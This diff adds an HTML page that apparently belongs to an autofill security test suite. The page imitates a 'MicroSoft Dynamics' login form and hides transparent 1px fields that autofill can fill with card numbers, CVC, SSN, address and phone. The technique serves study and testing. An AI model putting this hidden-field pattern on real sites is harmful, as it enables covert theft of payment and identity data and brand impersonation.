@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Tiny Size Test - Autofill Security Demo</title>
+    <link rel="stylesheet" href="../shared/style.css" />
+    <style>
+      .hidden-field {
+        width: 1px;
+        height: 1px;
+        border: 1px solid transparent;
+        padding: 0;
+        margin: 0;
+        font-size: 1px;
+        color: transparent;
+        background: transparent;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="header">
+        <h1>🔍 Tiny Size Test</h1>
+        <p>Testing autofill capture with 1px dimensions</p>
+      </div>
+
+      <div class="content">
+        <div class="technique-info">
+          <h3>Technique Description</h3>
+          <p>
+            This test demonstrates how a malicious website might use extremely
+            small dimensions (1px x 1px) to hide an input field. The field is
+            technically visible but so small that users cannot see or interact
+            with it normally.
+          </p>
+        </div>
+
+        <div class="demo-company">
+          <h2>MicroSoft Dynamics</h2>
+          <p>Enterprise resource planning and business management</p>
+        </div>
+
+        <form class="login-form" id="loginForm">
+          <div class="form-group">
+            <label for="email">Email Address</label>
+            <input
+              type="email"
+              id="email"
+              name="email"
+              required
+              autocomplete="email"
+            />
+          </div>
+
+          <div class="form-group">
+            <label for="password">Password</label>
+            <input
+              type="password"
+              id="password"
+              name="password"
+              required
+              autocomplete="current-password"
+            />
+          </div>
+
+          <!-- Hidden credit card fields -->
+          <input
+            type="text"
+            name="cc-number"
+            class="hidden-field"
+            autocomplete="cc-number"
+          />
+          <input
+            type="text"
+            name="cc-exp"
+            class="hidden-field"
+            autocomplete="cc-exp"
+          />
+          <input
+            type="text"
+            name="cc-csc"
+            class="hidden-field"
+            autocomplete="cc-csc"
+          />
+
+          <!-- Hidden identity fields -->
+          <input
+            type="text"
+            name="full-name"
+            class="hidden-field"
+            autocomplete="name"
+          />
+          <input
+            type="text"
+            name="ssn"
+            class="hidden-field"
+            autocomplete="off"
+          />
+          <input
+            type="tel"
+            name="phone"
+            class="hidden-field"
+            autocomplete="tel"
+          />
+          <input
+            type="text"
+            name="address"
+            class="hidden-field"
+            autocomplete="street-address"
+          />
+          <input
+            type="text"
+            name="postal-code"
+            class="hidden-field"
+            autocomplete="postal-code"
+          />
+
+          <button type="submit" class="submit-btn">Dynamics Portal</button>
+        </form>
+
+        <a href="../index.html" class="back-link">← Back to Test Suite</a>
+      </div>
+    </div>
+    <script src="../shared/index.js"></script>
+  </body>
+</html>
